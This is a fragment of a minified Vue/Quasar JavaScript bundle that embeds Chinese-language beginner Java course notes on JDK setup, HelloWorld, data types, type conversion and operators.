，从而来判断一个方法是否添加了注解 \n            retention  默认 是 只在Java 文件内有效，在 字节码文件  运行时 无效\n        元注解 \n            描述注解的注解      \n                常用元注解：retention 生命周期  target 使用范围  inherited  可被继承  documented   会出现在API文档\n        单元测试 Junit \n            @Test   @before  @after  \n        日志技术 log4j\n            日志体系结构 两套接口 ： JCL slf4j\n            可以直接使用 log4j\n            也可以使用 slf4j 里面的 api 来获取日志对象，使用 log4j 来实现 slf4j\n            好处是 以后更换日志的实现类 代码 基本不用改什么\n            log4j 组成：\n                1.loggers 记录器 日志的级别\n                2.appenders 输出源 日志要输出的地方\n                3.layouts 布局 日志输出的格式 \n\n    ')])])}],c={},p=c,u=t("2877"),m=Object(u["a"])(p,o,l,!1,null,"38f9d7bc",null),d=m.exports,g=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent1}}),t("q-markdown",{attrs:{src:n.MainComponent2}}),t("q-markdown",{attrs:{src:n.MainComponent3}}),t("q-markdown",{attrs:{src:n.MainComponent4}}),t("q-markdown",{attrs:{src:n.MainComponent5}}),t("q-markdown",{attrs:{src:n.MainComponent6}})],1)},b=[],v="## 1. Java概述\r\n\r\n### 1.1 Java语言背景介绍（了解）\r\n\r\n语言：人与人交流沟通的表达方式\r\n\r\n计算机语言：人与计算机之间进行信息交流沟通的一种特殊语言\r\n\r\nJava语言是美国Sun公司（Stanford University Network）在1995年推出的计算机语言\r\n\r\nJava之父：詹姆斯·高斯林（James Gosling）\r\n\r\n2009年，Sun公司被甲骨文公司收购，所以我们现在访问oracle官网即可：[https://www.oracle.com](https://www.oracle.com/) \r\n\r\njava语言的三个版本：\r\n\r\n​\tJavaSE:  Java 语言的（标准版），用于桌面应用的开发，是其他两个版本的基础\r\n\r\n​\tJavaME: Java 语言的（小型版），用于嵌入式消费类电子设备\r\n\r\n​\tJavaEE: Java 语言的（企业版），用于 Web 方向的网站开发\r\n\r\n### 1.2 Java语言跨平台原理（理解）\r\n\r\nJava程序并非是直接运行的，Java编译器将Java源程序编译成与平台无关的字节码文件(class文件)，然后由Java虚拟机（JVM）对字节码文件解释执行。所以在不同的操作系统下，只需安装不同的Java虚拟机即可实现java程序的跨平台。\r\n\r\n### 1.3 JRE和JDK（记忆）\r\n\r\nJVM（Java Virtual Machine），Java虚拟机\r\n\r\nJRE（Java Runtime Environment），Java运行环境，包含了JVM和Java的核心类库（Java API）\r\n\r\nJDK（Java Development Kit）称为Java开发工具，包含了JRE和开发工具\r\n\r\n总结：我们只需安装JDK即可，它包含了java的运行环境和虚拟机。\r\n\r\n### 1.4 JDK的下载和安装（应用）\r\n\r\n#### 1.4.1 下载\r\n\r\n通过官方网站获取JDK\r\n\r\n[http://www.oracle.com](http://www.oracle.com/)\r\n\r\n**注意**：针对不同的操作系统，需要下载对应版本的JDK。\r\n\r\n#### 1.4.2 安装\r\n\r\n傻瓜式安装，下一步即可。但默认的安装路径是在C:\\Program Files下，为方便统一管理建议修改安装路径，将与开发相关的软件都安装到一个目录下，例如：E:\\develop。\r\n\r\n**注意**：安装路径不要包含中文或者空格等特殊字符（使用纯英文目录）。\r\n\r\n#### 1.4.3 JDK的安装目录介绍\r\n\r\n| 目录名称 | 说明                                                         |\r\n| -------- | ------------------------------------------------------------ |\r\n| bin      | 该路径下存放了JDK的各种工具命令。javac和java就放在这个目录。 |\r\n| conf     | 该路径下存放了JDK的相关配置文件。                            |\r\n| include  | 该路径下存放了一些平台特定的头文件。                         |\r\n| jmods    | 该路径下存放了JDK的各种模块。                                |\r\n| legal    | 该路径下存放了JDK各模块的授权文档。                          |\r\n| lib      | 该路径下存放了JDK工具的一些补充JAR包。                       |\r\n\r\n\r\n\r\n## 2. 第一个演示程序\r\n\r\n### 2.1 常用DOS命令（应用）\r\n\r\n在接触集成开发环境之前，我们需要使用命令行窗口对java程序进行编译和运行，所以需要知道一些常用DOS命令。\r\n\r\n1、打开命令行窗口的方式：win + r打开运行窗口，输入cmd，回车。\r\n\r\n2、常用命令及其作用\r\n\r\n| 操作               | 说明                              |\r\n| ------------------ | --------------------------------- |\r\n| 盘符名称:          | 盘符切换。E:回车，表示切换到E盘。 |\r\n| dir                | 查看当前路径下的内容。            |\r\n| cd 目录            | 进入单级目录。cd itheima          |\r\n| cd ..              | 回退到上一级目录。                |\r\n| cd 目录1\\目录2\\... | 进入多级目录。cd itheima\\JavaSE   |\r\n| cd \\               | 回退到盘符目录。                  |\r\n| cls                | 清屏。                            |\r\n| exit               | 退出命令提示符窗口。              |\r\n\r\n### 2.2 Path环境变量的配置（应用）\r\n\r\n#### 2.2.1 为什么配置环境变量\r\n\r\n开发Java程序，需要使用JDK提供的开发工具（比如javac.exe、java.exe等命令），而这些工具在JDK的安装目录的bin目录下，如果不配置环境变量，那么这些命令只可以在该目录下执行。我们不可能把所有的java文件都放到JDK的bin目录下，所以配置环境变量的作用就是可以使bin目录下的java相关命令可以在任意目录下使用。    \r\n\r\n### 2.3 HelloWorld案例（应用）\r\n\r\nHelloWorld案例是指在计算机屏幕上输出“HelloWorld”这行文字。\r\n\r\n各种计算机语言都习惯使用该案例作为第一个演示案例。\r\n\r\n#### 2.3.1 Java程序开发运行流程\r\n\r\n开发Java程序，需要三个步骤：编写程序，编译程序，运行程序。\r\n\r\n#### 2.3.2 HelloWorld案例的编写\r\n\r\n1、新建文本文档文件，修改名称为HelloWorld.java。\r\n\r\n2、用记事本打开HelloWorld.java文件，输写程序内容。\r\n\r\n~~~java\r\npublic class HelloWorld {\r\n\tpublic static void main(String[] args) {\r\n\t\tSystem.out.println(\"HelloWorld\");\r\n\t}\r\n}\r\n~~~\r\n\r\n#### 2.3.3 HelloWorld案例的编译和运行\r\n\r\n存文件，打开命令行窗口，将目录切换至java文件所在目录，编译java文件生成class文件，运行class文件。\r\n\r\n> 编译：javac 文件名.java\r\n>\r\n> 范例：javac HelloWorld.java\r\n>\r\n> 执行：java 类名\r\n>\r\n> 范例：java HelloWorld\r\n\r\n### 2.4 HelloWorld案例详解（理解）\r\n\r\n![](./img/java/basics/day01-java基础语法.img/图片1.jpg)\r\n\r\n### 2.5 HelloWorld案例常见问题（理解）\r\n\r\n#### 2.5.1 BUG\r\n\r\n在电脑系统或程序中，隐藏着的一些未被发现的缺陷或问题统称为bug（漏洞）。\r\n\r\n#### 2.5.2 BUG的解决\r\n\r\n1、具备识别BUG的能力：多看\r\n\r\n2、具备分析BUG的能力：多思考，多查资料\r\n\r\n3、具备解决BUG的能力：多尝试，多总结\r\n\r\n#### 2.5.3 HelloWorld案例常见问题\r\n\r\n1、非法字符问题。Java中的符号都是英文格式的。\r\n\r\n2、大小写问题。Java语言对大小写敏感（区分大小写）。\r\n\r\n3、在系统中显示文件的扩展名，避免出现HelloWorld.java.txt文件。\r\n\r\n4、编译命令后的java文件名需要带文件后缀.java\r\n\r\n5、运行命令后的class文件名（类名）不带文件后缀\r\n\r\n### 2.6 Notepad++软件的安装和使用（应用）\r\n\r\n#### 2.6.1 什么要使用Notepad++软件\r\n\r\nNotepad++功能比windows中的自带记事本功能强大，除了可以用来制作一般的纯文字说明文件，也十分适合编写计算机程序代码。Notepad++有行号，能够快速定位问题位置，还有语法高亮度显示、代码折叠等功能。而且它是免费的。\r\n\r\n#### 2.6.2 Notepad++软件安装\r\n\r\n安装：傻瓜式安装，一直下一步即可。建议也安装到统一的开发软件目录下，比如E:\\develop。\r\n\r\n#### 2.6.3Notepad++软件配置\r\n\r\n安装完毕之后，为了使用方便，做一个简单的配置：修改默认语言和编码。\r\n\r\n## 3. java基础语法\r\n\r\n### 3.1 注释（理解）\r\n\r\n注释是对代码的解释和说明文字，可以提高程序的可读性，因此在程序中添加必要的注释文字十分重要。Java中的注释分为三种：\r\n\r\n单行注释。单行注释的格式是使用//，从//开始至本行结尾的文字将作为注释文字。\r\n\r\n~~~java\r\n// 这是单行注释文字\r\n~~~\r\n\r\n多行注释。多行注释的格式是使用/* 和 */将一段较长的注释括起来。\r\n\r\n~~~java\r\n/*\r\n这是多行注释文字\r\n这是多行注释文字\r\n这是多行注释文字\r\n*/\r\n注意：多行注释不能嵌套使用。\r\n~~~\r\n\r\n文档注释。文档注释以`/**`开始，以`*/`结束。（以后讲）\r\n\r\n### 3.2 关键字（理解）\r\n\r\n关键字是指被java语言赋予了特殊含义的单词。\r\n\r\n关键字的特点：\r\n\r\n​\t关键字的字母全部小写。\r\n\r\n​\t常用的代码编辑器对关键字都有高亮显示，比如现在我们能看到的public、class、static等。\r\n\r\n### 3.3 常量（应用）\r\n\r\n常量：在程序运行过程中，其值不可以发生改变的量。\r\n\r\nJava中的常量分类：\r\n\r\n​\t字符串常量  用双引号括起来的多个字符（可以包含0个、一个或多个），例如\"a\"、\"abc\"、\"中国\"等\r\n\r\n​\t整数常量  整数，例如：-10、0、88等\r\n\r\n​\t小数常量  小数，例如：-5.5、1.0、88.88等\r\n\r\n​\t字符常量  用单引号括起来的一个字符，例如：'a'、'5'、'B'、'中'等\r\n\r\n​\t布尔常量  布尔值，表示真假，只有两个值true和false\r\n\r\n​\t空常量  一个特殊的值，空值，值为null\r\n\r\n除空常量外，其他常量均可使用输出语句直接输出。\r\n\r\n~~~java\r\npublic class Demo {\r\n    public static void main(String[] args) {\r\n        System.out.println(10); // 输出一个整数\r\n        System.out.println(5.5); // 输出一个小数\r\n        System.out.println('a'); // 输出一个字符\r\n        System.out.println(true); // 输出boolean值true\r\n        System.out.println(\"欢迎来到黑马程序员\"); // 输出字符串\r\n    }\r\n}\r\n~~~\r\n\r\n### 3.4 变量的介绍(理解)\r\n\r\n变量的定义格式：\r\n\r\n​\t数据类型 变量名 = 数据值；\r\n\r\n​\t数据类型：为空间中存储的数据加入类型限制。整数？小数？\r\n\r\n​\t变量名：自己要为空间起的名字，没有难度\r\n\r\n​\t数据值： 空间中要存储的数值，没有难度\r\n\r\n### 3.5 数据类型（应用）\r\n\r\n#### 3.5.1 计算机存储单元\r\n\r\n我们知道计算机是可以用来存储数据的，但是无论是内存还是硬盘，计算机存储设备的最小信息单元叫“位（bit）”，我们又称之为“比特位”，通常用小写的字母”b”表示。而计算机中最基本的存储单元叫“字节（byte）”，\r\n\r\n通常用大写字母”B”表示，字节是由连续的8个位组成。\r\n\r\n除了字节外还有一些常用的存储单位，其换算单位如下：\r\n\r\n1B（字节） = 8bit\r\n\r\n1KB = 1024B\r\n\r\n1MB = 1024KB\r\n\r\n1GB = 1024MB\r\n\r\n1TB = 1024GB\r\n\r\n#### 3.5.2 Java中的数据类型\r\n\r\nJava是一个强类型语言，Java中的数据必须明确数据类型。在Java中的数据类型包括基本数据类型和引用数据类型两种。\r\n\r\nJava中的基本数据类型：\r\n\r\n| 数据类型 | 关键字       | 内存占用 | 取值范围                                                     |\r\n| :------- | ------------ | -------- | :----------------------------------------------------------- |\r\n| 整数类型 | byte         | 1        | -128~127                                                     |\r\n|          | short        | 2        | -32768~32767                                                 |\r\n|          | int(默认)    | 4        | -2的31次方到2的31次方-1                                      |\r\n|          | long         | 8        | -2的63次方到2的63次方-1                                      |\r\n| 浮点类型 | float        | 4        | 负数：-3.402823E+38到-1.401298E-45                                                             正数：   1.401298E-45到3.402823E+38 |\r\n|          | double(默认) | 8        | 负数：-1.797693E+308到-4.9000000E-324                                              正数：4.9000000E-324   到1.797693E+308 |\r\n| 字符类型 | char         | 2        | 0-65535                                                      |\r\n| 布尔类型 | boolean      | 1        | true，false                                                  |\r\n\r\n说明：\r\n\r\n​\te+38表示是乘以10的38次方，同样，e-45表示乘以10的负45次方。\r\n\r\n​\t在java中整数默认是int类型，浮点数默认是double类型。\r\n\r\n### 3.6 变量（应用）\r\n\r\n#### 3.6.1 变量的定义\r\n\r\n变量：在程序运行过程中，其值可以发生改变的量。\r\n\r\n从本质上讲，变量是内存中的一小块区域，其值可以在一定范围内变化。\r\n\r\n变量的定义格式：\r\n\r\n```java\r\n数据类型 变量名 = 初始化值; // 声明变量并赋值\r\nint age = 18;\r\nSystem.out.println(age);\r\n```\r\n\r\n或者(扩展)\r\n\r\n```java\r\n// 先声明，后赋值（使用前赋值即可）\r\n数据类型 变量名;\r\n变量名 = 初始化值;\r\ndouble money;\r\nmoney = 55.5;\r\nSystem.out.println(money);\r\n```\r\n\r\n还可以(扩展)\r\n\r\n在同一行定义多个同一种数据类型的变量，中间使用逗号隔开。但不建议使用这种方式，降低程序的可读性。\r\n\r\n```java\r\nint a = 10, b = 20; // 定义int类型的变量a和b，中间使用逗号隔开\r\nSystem.out.println(a);\r\nSystem.out.println(b);\r\n\r\nint c,d; // 声明int类型的变量c和d，中间使用逗号隔开\r\nc = 30;\r\nd = 40;\r\nSystem.out.println(c);\r\nSystem.out.println(d);\r\n```\r\n\r\n#### 3.6.2 变量的修改\r\n\r\n```java\r\nint a = 10;\r\na = 30;  //修改变量的值\r\nSystem.out.println(a);\r\n```\r\n\r\n变量前面不加数据类型时，表示修改已存在的变量的值。\r\n\r\n### 3.7 变量的注意事项(理解)\r\n\r\n1. 在同一对花括号中，变量名不能重复。\r\n2. 变量在使用之前，必须初始化（赋值）。\r\n3. 定义long类型的变量时，需要在整数的后面加L（大小写均可，建议大写）。因为整数默认是int类型，整数太大可能超出int范围。\r\n4. 定义float类型的变量时，需要在小数的后面加F（大小写均可，建议大写）。因为浮点数的默认类型是double， double的取值范围是大于float的，类型不兼容。\r\n\r\n### 3.8 键盘录入（理解）\r\n\r\n我们可以通过 Scanner 类来获取用户的输入。使用步骤如下：\r\n\r\n1、导包。Scanner 类在java.util包下，所以需要将该类导入。导包的语句需要定义在类的上面。\r\n\r\n```java\r\nimport java.util.Scanner; \r\n```\r\n\r\n2、创建Scanner对象。\r\n\r\n```java\r\nScanner sc = new Scanner(System.in);// 创建Scanner对象，sc表示变量名，其他均不可变\r\n```\r\n\r\n3、接收数据\r\n\r\n```java\r\nint i = sc.nextInt(); // 表示将键盘录入的值作为int数返回。\r\n```\r\n\r\n示例：\r\n\r\n```java\r\nimport java.util.Scanner;\r\npublic class ScannerDemo {\r\n\tpublic static void main(String[] args) {\r\n\t\t//创建对象\r\n\t\tScanner sc = new Scanner(System.in);\r\n\t\t//接收数据\r\n\t\tint a = sc.nextInt();\r\n\t\t//输出数据\r\n\t\tSystem.out.println(a);\r\n\t}\r\n}\r\n```\r\n\r\n### 3.9 标识符（理解）\r\n\r\n标识符是用户编程时使用的名字，用于给类、方法、变量、常量等命名。\r\n\r\nJava中标识符的组成规则：\r\n\r\n​\t由字母、数字、下划线“_”、美元符号“$”组成，第一个字符不能是数字。\r\n\r\n​\t不能使用java中的关键字作为标识符。\t\r\n\r\n​\t标识符对大小写敏感（区分大小写）。\r\n\r\nJava中标识符的命名约定：\r\n\r\n​\t小驼峰式命名：变量名、方法名\r\n\r\n​\t\t首字母小写，从第二个单词开始每个单词的首字母大写。\r\n\r\n​\t大驼峰式命名：类名\r\n\r\n​\t\t每个单词的首字母都大写。\r\n\r\n​\t另外，标识符的命名最好可以做到见名知意\r\n\r\n​\t\t例如：username、studentNumber等。\r\n\r\n",h='# Java基础语法\r\n\r\n## 1 类型转换\r\n\r\n在Java中，一些数据类型之间是可以相互转换的。分为两种情况：自动类型转换和强制类型转换。\r\n\r\n### 1.1 隐式转换(理解)\r\n\r\n​\t把一个表示数据范围小的数值或者变量赋值给另一个表示数据范围大的变量。这种转换方式是自动的，直接书写即可。例如：\r\n\r\n```java\r\ndouble num = 10; // 将int类型的10直接赋值给double类型\r\nSystem.out.println(num); // 输出10.0\r\n```\r\n\r\n​\t类型从小到大关系图：\r\n\r\n​\t![](./img/java/basics/day02-Java基础语法.img/图片1.png)\r\n\r\n说明：\r\n\r\n1. 整数默认是int类型，byte、short和char类型数据参与运算均会自动转换为int类型。\r\n\r\n```java\r\nbyte b1 = 10;\r\nbyte b2 = 20;\r\nbyte b3 = b1 + b2; \r\n// 第三行代码会报错，b1和b2会自动转换为int类型，计算结果为int，int赋值给byte需要强制类型转换。\r\n// 修改为:\r\nint num = b1 + b2;\r\n// 或者：\r\nbyte b3 = (byte) (b1 + b2);\r\n```\r\n\r\n2. boolean类型不能与其他基本数据类型相互转换。\r\n\r\n### 1.2 强制转换(理解)\r\n\r\n​\t把一个表示数据范围大的数值或者变量赋值给另一个表示数据范围小的变量。\r\n\r\n​\t强制类型转换格式：目标数据类型 变量名 = (目标数据类型)值或者变量;\r\n\r\n​\t例如：\r\n\r\n```java\r\ndouble num1 = 5.5;\r\nint num2 = (int) num1; // 将double类型的num1强制转换为int类型\r\nSystem.out.println(num2); // 输出5（小数位直接舍弃）\r\n```\r\n\r\n### 1.3 类型转换案例(理解)\r\n\r\n案例代码：\r\n\r\n```java\r\nbyte a = 3;\r\nbyte b = 4;\r\nbyte c = a + b; //错误。因为两个byte变量相加，会先提升为int类型\r\nbyte d = 3 + 4; //正确。常量优化机制\r\n```\r\n\r\n常量优化机制：\r\n\r\n​\t在编译时，整数常量的计算会直接算出结果，并且会自动判断该结果是否在byte取值范围内，\r\n\r\n​\t\t在：编译通过\r\n\r\n  \t\t不在：编译失败\r\n\r\n## 2. 运算符\r\n\r\n### 2.1 算术运算符\r\n\r\n#### 2.1.1 运算符和表达式（了解）\r\n\r\n运算符：对常量或者变量进行操作的符号\r\n\r\n表达式：用运算符把常量或者变量连接起来符合java语法的式子就可以称为表达式。\r\n\r\n​                    不同运算符连接的表达式体现的是不同类型的表达式。\r\n\r\n举例说明：\r\n\r\n```java\r\nint a = 10;\r\nint b = 20;\r\nint c = a + b;\r\n```\r\n\r\n  +：是运算符，并且是算术运算符。\r\n\r\n  a + b：是表达式，由于+是算术运算符，所以这个表达式叫算术表达式。\r\n\r\n####  2.1.2 算术运算符(应用)\r\n\r\n| 符号 | 作用 | 说明                         |\r\n| ---- | ---- | ---------------------------- |\r\n| +    | 加   | 参看小学一年级               |\r\n| -    | 减   | 参看小学一年级               |\r\n| *    | 乘   | 参看小学二年级，与“×”相同    |\r\n| /    | 除   | 参看小学二年级，与“÷”相同    |\r\n| %    | 取余 | 获取的是两个数据做除法的余数 |\r\n\r\n注意：\r\n\r\n1. /和%的区别：两个数据做除法，/取结果的商，%取结果的余数。\r\n\r\n2. 整数操作只能得到整数，要想得到小数，必须有浮点数参与运算。\r\n\r\n~~~java\r\nint a = 10;\r\nint b = 3;\r\nSystem.out.println(a / b); // 输出结果3\r\nSystem.out.println(a % b); // 输出结果1\r\n~~~\r\n\r\n#### 2.1.3 字符的“+”操作（理解）\r\n\r\nchar类型参与算术运算，使用的是计算机底层对应的十进制数值。需要我们记住三个字符对应的数值：\r\n\r\n\'a\'  --  97\t\ta-z是连续的，所以\'b\'对应的数值是98，\'c\'是99，依次递加\r\n\r\n\'A\'  --  65\t\tA-Z是连续的，所以\'B\'对应的数值是66，\'C\'是67，依次递加\r\n\r\n\'0\'  --  48\t\t0-9是连续的，所以\'1\'对应的数值是49，\'2\'是50，依次递加\r\n\r\n~~~java\r\n// 可以通过使用字符与整数做算术运算，得出字符对应的数值是多少\r\nchar ch1 = \'a\';\r\nSystem.out.println(ch1 + 1); // 输出98，97 + 1 = 98\r\n\r\nchar ch2 = \'A\';\r\nSystem.out.println(ch2 + 1); // 输出66，65 + 1 = 66\r\n\r\nchar ch3 = \'0\';\r\nSystem.out.println(ch3 + 1); // 输出49，48 + 1 = 49\r\n~~~\r\n\r\n算术表达式中包含不同的基本数据类型的值的时候，整个算术表达式的类型会自动进行提升。\r\n\r\n提升规则：\r\n\r\nbyte类型，short类型和char类型将被提升到int类型，不管是否有其他类型参与运算。\r\n\r\n整个表达式的类型自动提升到与表达式中最高等级的操作数相同的类型\r\n\r\n​       等级顺序：byte,short,char --\x3e int --\x3e long --\x3e float --\x3e double\r\n\r\n例如：\r\n\r\n~~~java\r\nbyte b1 = 10;\r\nbyte b2 = 20;\r\n// byte b3 = b1 + b2; // 该行报错，因为byte类型参与算术运算会自动提示为int，int赋值给byte可能损失精度\r\nint i3 = b1 + b2; // 应该使用int接收\r\nbyte b3 = (byte) (b1 + b2); // 或者将结果强制转换为byte类型\r\n-------------------------------\r\nint num1 = 10;\r\ndouble num2 = 20.0;\r\ndouble num3 = num1 + num2; // 使用double接收，因为num1会自动提升为double类型\r\n~~~\r\n\r\n#### 2.1.4 字符串的“+”操作（理解）\r\n\r\n当“+”操作中出现字符串时，这个”+”是字符串连接符，而不是算术运算。\r\n\r\n~~~java\r\nSystem.out.println("itheima"+ 666); // 输出：itheima666\r\n~~~\r\n\r\n在”+”操作中，如果出现了字符串，就是连接运算符，否则就是算术运算。当连续进行“+”操作时，从左到右逐个执行。\r\n\r\n~~~java\r\nSystem.out.println(1 + 99 + "年黑马");            // 输出：100年黑马\r\nSystem.out.println(1 + 2 + "itheima" + 3 + 4);   // 输出：3itheima34\r\n// 可以使用小括号改变运算的优先级 \r\nSystem.out.println(1 + 2 + "itheima" + (3 + 4)); // 输出：3itheima7\r\n~~~\r\n\r\n#### 2.1.5 数值拆分（应用）\r\n\r\n需求：\r\n\r\n​\t键盘录入一个三位数，将其拆分为个位，十位，百位，打印在控制台\r\n\r\n示例代码：\r\n\r\n```java\r\nimport java.util.Scanner;\r\npublic class Test {\r\n\tpublic static void main(String[] args) {\r\n\t\t// 1：使用Scanner键盘录入一个三位数\r\n\t\tScanner sc = new Scanner(System.in);\r\n\t\tSystem.out.println("请输入一个三位数");\r\n\t\tint num = sc.nextInt();\r\n\t\t// 2：个位的计算：数值 % 10\r\n\t\tint ge = num % 10;\t\t\r\n\t\t// 3：十位的计算：数值 / 10 % 10\r\n\t\tint shi = num / 10 % 10;\t\r\n\t\t// 4：百位的计算：数值 / 100\r\n\t\tint bai = num / 100;\r\n\t\t// 5：将个位, 十位, 百位拼接上正确的字符串, 打印即可\r\n\t\tSystem.out.println("整数"+num+"个位为:" + ge);\r\n\t\tSystem.out.println("整数"+num+"十位为:" + shi);\r\n\t\tSystem.out.println("整数"+num+"百位为:" + bai);\r\n\t\t\r\n\t}\r\n}\r\n```\r\n\r\n### 2.2 自增自减运算符（理解）\r\n\r\n| 符号 | 作用 | 说明        |\r\n| ---- | ---- | ----------- |\r\n| ++   | 自增 | 变量的值加1 |\r\n| --   | 自减 | 变量的值减1 |\r\n\r\n注意事项：\r\n\r\n​\t++和-- 既可以放在变量的后边，也可以放在变量的前边。\r\n\r\n​\t单独使用的时候， ++和-- 无论是放在变量的前边还是后边，结果是一样的。\r\n\r\n​\t参与操作的时候，如果放在变量的后边，先拿变量参与操作，后拿变量做++或者--。\r\n\r\n​\t参与操作的时候，如果放在变量的前边，先拿变量做++或者--，后拿变量参与操作。\r\n\r\n​\t最常见的用法：单独使用。\r\n\r\n```java\r\nint i = 10;\r\ni++; // 单独使用\r\nSystem.out.println("i:" + i); // i:11\r\n\r\nint j = 10;\r\n++j; // 单独使用\r\nSystem.out.println("j:" + j); // j:11\r\n\r\nint x = 10;\r\nint y = x++; // 赋值运算，++在后边，所以是使用x原来的值赋值给y，x本身自增1\r\nSystem.out.println("x:" + x + ", y:" + y); // x:11，y:10\r\n\r\nint m = 10;\r\nint n = ++m; // 赋值运算，++在前边，所以是使用m自增后的值赋值给n，m本身自增1\r\nSystem.out.println("m:" + m + ", m:" + m); // m:11，m:11\r\n```\r\n\r\n练习：\r\n\r\n```java\r\nint x = 10;\r\nint y = x++ + x++ + x++;\r\nSystem.out.println(y); // y的值是多少？\r\n/*\r\n解析，三个表达式都是++在后，所以每次使用的都是自增前的值，但程序自左至右执行，所以第一次自增时，使用的是10进行计算，但第二次自增时，x的值已经自增到11了，所以第二次使用的是11，然后再次自增。。。\r\n所以整个式子应该是：int y = 10 + 11 + 12;\r\n输出结果为33。\r\n*/\r\n注意：通过此练习深刻理解自增和自减的规律，但实际开发中强烈建议不要写这样的代码！小心挨打！\r\n```\r\n\r\n### 2.3 赋值运算符（应用）\r\n\r\n赋值运算符的作用是将一个表达式的值赋给左边，左边必须是可修改的，不能是常量。\r\n\r\n| 符号 | 作用       | 说明                  |\r\n| ---- | ---------- | --------------------- |\r\n| =    | 赋值       | a=10，将10赋值给变量a |\r\n| +=   | 加后赋值   | a+=b，将a+b的值给a    |\r\n| -=   | 减后赋值   | a-=b，将a-b的值给a    |\r\n| *=   | 乘后赋值   | a*=b，将a×b的值给a    |\r\n| /=   | 除后赋值   | a/=b，将a÷b的商给a    |\r\n| %=   | 取余后赋值 | a%=b，将a÷b的余数给a  |\r\n\r\n注意：\r\n\r\n扩展的赋值运算符隐含了强制类型转换。\r\n\r\n~~~java\r\nshort s = 10;\r\ns = s + 10; // 此行代码报出，因为运算中s提升为int类型，运算结果int赋值给short可能损失精度\r\n\r\ns += 10; // 此行代码没有问题，隐含了强制类型转换，相当于 s = (short) (s + 10);\r\n~~~\r\n\r\n### 2.4 关系运算符（应用）\r\n\r\n关系运算符有6种关系，分别为小于、小于等于、大于、等于、大于等于、不等于。\r\n\r\n| 符号 | 说明                                                    |\r\n| ---- | ------------------------------------------------------- |\r\n| ==   | a==b，判断a和b的值是否相等，成立为true，不成立为false   |\r\n| !=   | a!=b，判断a和b的值是否不相等，成立为true，不成立为false |\r\n| >    | a>b，判断a是否大于b，成立为true，不成立为false          |\r\n| >=   | a>=b，判断a是否大于等于b，成立为true，不成立为false     |\r\n| <    | a<b，判断a是否小于b，成立为true，不成立为false          |\r\n| <=   | a<=b，判断a是否小于等于b，成立为true，不成立为false     |\r\n\r\n注意事项：\r\n\r\n​\t关系运算符的结果都是boolean类型，要么是true，要么是false。\r\n\r\n​\t千万不要把“==”误写成“=”，"=="是判断是否相等的关系，"="是赋值。\r\n\r\n~~~java\r\nint a = 10;\r\nint b = 20;\r\nSystem.out.println(a == b); // false\r\nSystem.out.println(a != b); // true\r\nSystem.out.println(a > b); // false\r\nSystem.out.println(a >= b); // false\r\nSystem.out.println(a < b); // true\r\nSystem.out.println(a <= b); // true\r\n\r\n// 关系运算的结果肯定是boolean类型，所以也可以将运算结果赋值给boolean类型的变量\r\nboolean flag = a > b;\r\nSystem.out.println(flag); // 输出false\r\n~~~\r\n\r\n### 2.5 逻辑运算符（应用）\r\n\r\n逻辑运算符把各个运算的关系表达式连接起来组成一个复杂的逻辑表达式，以判断程序中的表达式是否成立，判断的结果是 true 或 false。\r\n\r\n| 符号 | 作用     | 说明                                         |\r\n| ---- | -------- | -------------------------------------------- |\r\n| &    | 逻辑与   | a&b，a和b都是true，结果为true，否则为false   |\r\n| \\|   | 逻辑或   | a\\|b，a和b都是false，结果为false，否则为true |\r\n| ^    | 逻辑异或 | a^b，a和b结果不同为true，相同为false         |\r\n| !    | 逻辑非   | !a，结果和a的结果正好相反                    |\r\n\r\n~~~java\r\n//定义变量\r\nint i = 10;\r\nint j = 20;\r\nint k = 30;\r\n\r\n//& “与”，并且的关系，只要表达式中有一个值为false，结果即为false\r\nSystem.out.println((i > j) & (i > k)); //false & false,输出false\r\nSystem.out.println((i < j) & (i > k)); //true & false,输出false\r\nSystem.out.println((i > j) & (i < k)); //false & true,输出false\r\nSystem.out.println((i < j) & (i < k)); //true & true,输出true\r\nSystem.out.println("--------");\r\n\r\n//| “或”，或者的关系，只要表达式中有一个值为true，结果即为true\r\nSystem.out.println((i > j) | (i > k)); //false | false,输出false\r\nSystem.out.println((i < j) | (i > k)); //true | false,输出true\r\nSystem.out.println((i > j) | (i < k)); //false | true,输出true\r\nSystem.out.println((i < j) | (i < k)); //true | true,输出true\r\nSystem.out.println("--------");\r\n\r\n//^ “异或”，相同为false，不同为true\r\nSystem.out.println((i > j) ^ (i > k)); //false ^ false,输出false\r\nSystem.out.println((i < j) ^ (i > k)); //true ^ false,输出true\r\nSystem.out.println((i > j) ^ (i < k)); //false ^ true,输出true\r\nSystem.out.println((i < j) ^ (i < k)); //true ^ true,输出false\r\nSystem.out.println("--------");\r\n\r\n//! “非”，取反\r\nSystem.out.println((i > j)); //false\r\nSystem.out.println(!(i > j)); //!false，,输出true\r\n~~~\r\n\r\n### 2.6 短路逻辑运算符（理解）\r\n\r\n| 符号 | 作用   | 说明                         |\r\n| ---- | ------ | ---------------------------- |\r\n| &&   | 短路与 | 作用和&相同，但是有短路效果  |\r\n| \\|\\| | 短路或 | 作用和\\|相同，但是有短路效果 |\r\n\r\n在逻辑与运算中，只要有一个表达式的值为false，那么结果就可以判定为false了，没有必要将所有表达式的值都计算出来，短路与操作就有这样的效果，可以提高效率。同理在逻辑或运算中，一旦发现值为true，右边的表达式将不再参与运算。\r\n\r\n- 逻辑与&，无论左边真假，右边都要执行。\r\n\r\n- 短路与&&，如果左边为真，右边执行；如果左边为假，右边不执行。\r\n\r\n- 逻辑或|，无论左边真假，右边都要执行。\r\n\r\n- 短路或||，如果左边为假，右边执行；如果左边为真，右边不执行。\r\n\r\n~~~java\r\nint x = 3;\r\nint y = 4;\r\nSystem.out.println((x++ > 4) & (y++ > 5)); // 两个表达都会运算\r\nSystem.out.println(x); // 4\r\nSystem.out.println(y); // 5\r\n\r\nSystem.out.println((x++ > 4) && (y++ > 5)); // 左边已经可以确定结果为false，右边不参与运算\r\nSystem.out.println(x); // 4\r\nSystem.out.println(y); // 4\r\n~~~\r\n\r\n### 2.7 三元运算符（理解）\r\n\r\n三元运算符语法格式：\r\n\r\n~~~java\r\n关系表达式 ? 表达式1 : 表达式2;\r\n~~~\r\n\r\n解释：问号前面的位置是判断的条件，判断结果为boolean型，为true时调用表达式1，为false时调用表达式2。其逻辑为：如果条件表达式成立或者满足则执行表达式1，否则执行第二个。\r\n\r\n举例：\r\n\r\n~~~java\r\nint a = 10;\r\nint b = 20;\r\nint c = a > b ? a : b; // 判断 a>b 是否为真，如果为真取a的值，如果为假，取b的值\r\n~~~\r\n\r\n### 2.8 